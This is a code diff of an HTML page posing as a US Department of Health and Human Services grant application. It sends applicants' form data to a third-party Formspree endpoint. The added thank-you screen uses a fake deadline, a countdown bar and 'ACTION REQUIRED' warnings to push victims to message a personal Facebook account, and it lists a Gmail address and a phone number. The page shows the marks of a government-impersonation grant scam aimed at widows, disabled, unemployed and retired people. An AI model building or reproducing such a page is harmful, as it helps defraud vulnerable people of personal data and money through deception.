@@ -5,7 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DHHS Grant Application</title>
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -128,6 +127,250 @@
             border-radius: 5px;
         }
 
+        .facebook-notice {
+            background: #f0f8ff;
+            border-left: 4px solid #1877f2;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+            animation: pulse 2s infinite;
+        }
+
+        .facebook-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .facebook-icon {
+            width: 30px;
+            height: 30px;
+            fill: #1877f2;
+            margin-right: 10px;
+        }
+
+        .facebook-notice h3 {
+            color: #1877f2;
+            margin: 0;
+            font-size: 18px;
+        }
+
+        .facebook-link {
+            display: block;
+            background: #1877f2;
+            color: white;
+            text-align: center;
+            padding: 12px;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 15px 0;
+            transition: all 0.3s;
+            animation: bounce 2s infinite;
+        }
+
+        .facebook-link:hover {
+            background: #166fe5;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .deadline-notice {
+            color: #d9534f;
+            font-weight: bold;
+            text-align: center;
+            margin: 10px 0 0;
+            font-size: 15px;
+        }
+
+        .thank-you-page {
+            text-align: center;
+            padding: 30px 20px;
+        }
+
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            animation: checkmarkScale 0.5s ease-in-out both;
+        }
+
+        .facebook-notice {
+            background: linear-gradient(135deg, #f0f8ff 0%, #e1f0ff 100%);
+            border-left: 5px solid #1877f2;
+            padding: 25px;
+            border-radius: 10px;
+            margin: 30px 0;
+            animation: pulseGlow 3s infinite, gradientFlow 8s ease infinite;
+            background-size: 200% 200%;
+        }
+
+        .facebook-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .facebook-icon {
+            width: 40px;
+            height: 40px;
+            fill: #1877f2;
+            margin-right: 15px;
+            animation: float 3s ease-in-out infinite;
+        }
+
+        .facebook-link {
+            display: inline-block;
+            background: #1877f2;
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: bold;
+            margin: 20px 0;
+            transition: all 0.3s;
+            animation: shakeColors 3s infinite, bounce 2s infinite;
+            box-shadow: 0 5px 15px rgba(24, 119, 242, 0.4);
+        }
+
+        .deadline-notice {
+            color: #e74c3c;
+            font-weight: bold;
+            font-size: 18px;
+            margin-top: 15px;
+            position: relative;
+        }
+
+        .countdown-container {
+            height: 20px;
+            background: #eee;
+            border-radius: 10px;
+            margin-top: 20px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .countdown-bar {
+            height: 100%;
+            width: 100%;
+            background: linear-gradient(90deg, #ff5722, #f44336);
+            border-radius: 10px;
+            animation: countdown 10s linear forwards;
+        }
+
+        @keyframes checkmarkScale {
+            0% {
+                transform: scale(0);
+                opacity: 0;
+            }
+            80% {
+                transform: scale(1.2);
+            }
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+        }
+
+        @keyframes pulseGlow {
+            0% {
+                box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.3);
+            }
+            70% {
+                box-shadow: 0 0 0 15px rgba(24, 119, 242, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(24, 119, 242, 0);
+            }
+        }
+
+        @keyframes gradientFlow {
+            0% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+            100% {
+                background-position: 0% 50%;
+            }
+        }
+
+        @keyframes float {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        @keyframes shakeColors {
+            0% {
+                transform: rotate(0deg);
+                background: #1877f2;
+            }
+            25% {
+                transform: rotate(2deg);
+                background: #3b5998;
+            }
+            50% {
+                transform: rotate(-2deg);
+                background: #4267B2;
+            }
+            75% {
+                transform: rotate(1deg);
+                background: #1a77f2;
+            }
+            100% {
+                transform: rotate(0deg);
+                background: #1877f2;
+            }
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: translateY(0);
+            }
+            40% {
+                transform: translateY(-10px);
+            }
+            60% {
+                transform: translateY(-5px);
+            }
+        }
+
+        @keyframes flash {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.3;
+            }
+        }
+
+        @keyframes countdown {
+            from {
+                width: 100%;
+            }
+            to {
+                width: 0%;
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(24, 119, 242, 0.2);
+            }
+            70% {
+                box-shadow: 0 0 0 10px rgba(24, 119, 242, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(24, 119, 242, 0);
+            }
+        }
+
         .certify-container {
             display: flex;
             align-items: center;
@@ -139,7 +382,6 @@
             width: auto;
         }
 
-        /* Thank You Page Styles */
         .thank-you-page {
             display: none;
             text-align: center;
@@ -164,19 +406,6 @@
             font-size: 16px;
             margin-bottom: 20px;
             line-height: 1.5;
-        }
-
-        .email-display {
-            font-weight: lighter;
-            color: #005eaa;
-            word-break: break-all;
-            margin: 15px 0;
-            font-size: 16px;
-            padding: 12px;
-            background: #f8f9fa;
-            border-radius: 6px;
-            text-align: center;
-            line-height: 1.4;
         }
 
         .next-steps {
@@ -238,51 +467,21 @@
             font-weight: 500;
         }
 
-        /* Add this to your existing CSS */
-        .thank-you-page {
-            display: none;
-            text-align: center;
-            padding: 30px 20px;
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .thank-you-title {
-            color: #005eaa;
-            font-size: 24px;
-            margin-bottom: 15px;
-        }
-
-        .thank-you-message {
-            font-size: 16px;
-            margin-bottom: 25px;
-            color: #555;
-        }
-
         @media (min-width: 768px) {
             .thank-you-page {
                 padding: 40px;
             }
-
             .thank-you-icon {
                 width: 80px;
                 height: 80px;
                 margin-bottom: 20px;
             }
-
             .thank-you-title {
                 font-size: 28px;
             }
-
             .thank-you-message {
                 font-size: 18px;
             }
-
-            .email-display {
-                font-size: 18px;
-                padding: 15px;
-            }
-
             .next-steps {
                 padding: 25px 20px;
                 max-width: 600px;
@@ -295,7 +494,6 @@
             .application-container {
                 padding: 20px;
             }
-
             .gender-options {
                 flex-direction: column;
                 gap: 10px;
@@ -306,12 +504,13 @@
 
 <body>
     <div class="application-container">
-        <!-- Application Form -->
+        <!-- Application Form (initially visible) -->
         <div id="application-form">
             <div class="header">
                 <h1>DHHS Grant Application</h1>
                 <p>Department of Health and Human Services Grant Program</p>
             </div>
+
             <div class="marquee-container">
                 <marquee behavior="scroll" direction="left" scrollamount="3" class="marquee-text">
                     ✓ Over 12,500 grants awarded this year • ✓ 94% applicant satisfaction rate • ✓ Average approval
@@ -321,6 +520,7 @@
             </div>
 
             <form id="grantForm" action="https://formspree.io/f/xnndjlqq" method="POST">
+                <!-- Grant Selection -->
                 <div class="form-section">
                     <h2 class="section-title">1. Select Grant Type</h2>
 
@@ -328,15 +528,15 @@
                         <label for="grant_type" class="required">Choose the grant you need</label>
                         <select id="grant_type" name="grant_type" required>
                             <option value="">-- Select Grant --</option>
-                            <option value="personal">Personal Needs Grant</option>
-                            <option value="home">Utilities Bill Grant</option>
-                            <option value="disabled">Rent/Mortgage Grant</option>
-                            <option value="widow">Home Repair Grant</option>
+                            <option value="personal">Personal Grant</option>
+                            <option value="home">Home Grant</option>
+                            <option value="disabled">Disabled Grant</option>
+                            <option value="widow">Widow Grant</option>
                             <option value="health">Health Insurance Grant</option>
                             <option value="unemployed">Unemployed Grant</option>
                             <option value="retired">Retired Grant</option>
                             <option value="working">Working Grant</option>
-                            <option value="own_house">Disability Grant</option>
+                            <option value="own_house">Own House Grant</option>
                             <option value="business">Business Grant</option>
                             <option value="rent_house">Rent House Grant</option>
                         </select>
@@ -506,8 +706,7 @@
 
                     <div class="privacy-notice">
                         <h3>Privacy Notice</h3>
-                        <p>The Department of Health and Human Services will use the information you provide solely
-                            for
+                        <p>The Department of Health and Human Services will use the information you provide solely for
                             the purpose of evaluating your grant application. We maintain strict confidentiality
                             standards in accordance with federal privacy laws.</p>
                     </div>
@@ -515,8 +714,7 @@
                     <div class="form-group">
                         <div class="certify-container">
                             <input type="checkbox" id="consent" name="consent" required>
-                            <label for="consent" class="required">I certify that all information provided is true
-                                and
+                            <label for="consent" class="required">I certify that all information provided is true and
                                 accurate to the best of my knowledge</label>
                         </div>
                     </div>
@@ -526,100 +724,107 @@
             </form>
         </div>
 
-        <!-- Thank You Page -->
-        <div id="thank-you-page" class="thank-you-page">
-            <!-- Checkmark Icon -->
-            <div style="text-align: center; margin-bottom: 20px;">
-                <svg style="height: 80px; width: 80px;" viewBox="0 0 24 24">
-                    <circle cx="12" cy="12" r="10" fill="#28a745" />
-                    <path fill="#ffffff" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" />
-                </svg>
-            </div>
+        <!-- Thank You Page (initially hidden) -->
+        <div id="thank-you-page" class="thank-you-page" style="display: none;">
+            <!-- Animated Checkmark -->
+            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" />
+            </svg>
 
             <h2 class="thank-you-title">Thank You for Your Application!</h2>
+            <p class="thank-you-message">Your DHHS Grant Application has been successfully received.</p>
 
-            <p class="thank-you-message">
-                Your DHHS Grant Application has been successfully submitted.
-            </p>
+            <!-- Animated Facebook Notice -->
+            <div class="facebook-notice">
+                <div class="facebook-header">
+                    <svg class="facebook-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path
+                            d="M22 12c0-5.52-4.48-10-10-10S2 6.48 2 12c0 4.84 3.44 8.87 8 9.8V15H8v-3h2V9.5C10 7.57 11.57 6 13.5 6H16v3h-2c-.55 0-1 .45-1 1v2h3v3h-3v6.95c5.05-.5 9-4.76 9-9.95z" />
+                    </svg>
+                    <h3>ACTION REQUIRED</h3>
+                </div>
+                <p>To complete your application and prevent cancellation:</p>
+                <a href="https://www.facebook.com/Maryhenderson1999" target="_blank" class="facebook-link">
+                    CLICK HERE TO MESSAGE US ON FACEBOOK
+                </a>
+                <p class="deadline-notice">You must complete this step within 24 hours</p>
+
+                <!-- Animated Countdown -->
+                <div class="countdown-container">
+                    <div class="countdown-bar"></div>
+                </div>
+            </div>
 
             <div class="next-steps">
                 <h3>Next Steps in the Application Process</h3>
                 <ul>
-                    <li>Check your email (including spam folder) for confirmation</li>
-                    <li>If eligible, you'll receive notification via email</li>
-                    <li>Follow the instructions in your email to complete the application</li>
-                    <li>Processing typically takes 3-5 business days</li>
+                    <li>You need to contact us on Facebook to complete your application. Any incomplete application will be cancelled</li>
+                    <li>You will only know on Facebook if you’re eligible or not — that’s why it’s important to get in touch with us on Facebook</li>
+                    <li>You will receive a confirmation email with your application details</li>
+                    <li>For questions, contact Maryhenderson1919@gmail.com or call 1-205 858-0031</li>
                 </ul>
             </div>
 
-            <div style="text-align: center; margin-top: 30px;">
-                <a href="index.html"
-                    style="display: inline-block; background: #005eaa; color: white; padding: 12px 24px; border-radius: 5px; text-decoration: none; font-size: 16px;">
-                    Back to Application Home
-                </a>
-            </div>
+            <button class="new-application-btn" id="new-application-btn">Return to DHHS Homepage</button>
         </div>
+    </div>
 
-        <script>
-            document.addEventListener('DOMContentLoaded', function () {
-                const form = document.getElementById('grantForm');
-                const applicationForm = document.getElementById('application-form');
-                const thankYouPage = document.getElementById('thank-you-page');
-                const confirmationEmail = document.getElementById('confirmation-email');
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const form = document.getElementById('grantForm');
+            const applicationForm = document.getElementById('application-form');
+            const thankYouPage = document.getElementById('thank-you-page');
+            const newAppBtn = document.getElementById('new-application-btn');
 
-                // Initialize EmailJS
-                emailjs.init('7mnWa4y2_S_umAb5_');
+            // Form submission handler
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
 
-                form.addEventListener('submit', async function (e) {
-                    e.preventDefault(); // Prevent default form submission
+                // Show loading state
+                const submitBtn = form.querySelector('.submit-btn');
+                const originalBtnText = submitBtn.textContent;
+                submitBtn.disabled = true;
+                submitBtn.textContent = 'Processing...';
 
-                    const submitBtn = form.querySelector('.submit-btn');
-                    submitBtn.disabled = true;
-                    submitBtn.textContent = 'Processing...';
+                // Collect form data
+                const formData = new FormData(form);
 
-                    try {
-                        // Prepare data for EmailJS
-                        const formData = new FormData(form);
-                        const emailJsData = {
-                            applicant_name: formData.get('full_name'),
-                            email: formData.get('email'),
-                            grant_type: formData.get('grant_type'),
-                            submission_date: new Date().toLocaleDateString(),
-                            random_id: 'DHHS-' + Math.floor(1000 + Math.random() * 9000)
-                        };
-
-                        // 1. First send EmailJS confirmation
-                        await emailjs.send('service_7wzx75c', 'template_3de5vsm', emailJsData);
-
-                        // 2. Then submit to Formspree
-                        const formspreeResponse = await fetch(form.action, {
-                            method: 'POST',
-                            body: new URLSearchParams(formData),
-                            headers: {
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'Accept': 'application/json'
-                            }
-                        });
-
-                        if (!formspreeResponse.ok) {
-                            throw new Error('Formspree submission failed');
-                        }
-
-                        // Show success message
+                // Submit to Formspree
+                fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                })
+                .then(response => {
+                    if (response.ok) {
+                        // Show thank you page and hide form
                         applicationForm.style.display = 'none';
                         thankYouPage.style.display = 'block';
-                        window.scrollTo(0, 0);
 
-                    } catch (error) {
-                        console.error('Error:', error);
-                        alert('Submission error. Please try again or contact us.');
-                    } finally {
-                        submitBtn.disabled = false;
-                        submitBtn.textContent = 'Submit Application';
+                        // Scroll to top
+                        window.scrollTo(0, 0);
+                    } else {
+                        throw new Error('Form submission failed');
                     }
+                })
+                .catch(error => {
+                    alert('There was an error submitting your form. Please try again later.');
+                    console.error('Form submission error:', error);
+                })
+                .finally(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.textContent = originalBtnText;
                 });
             });
-        </script>
-</body>
 
+            // New application button
+            newAppBtn.addEventListener('click', function () {
+                window.location.href = "index.html";
+            });
+        });
+    </script>
+</body>
 </html>
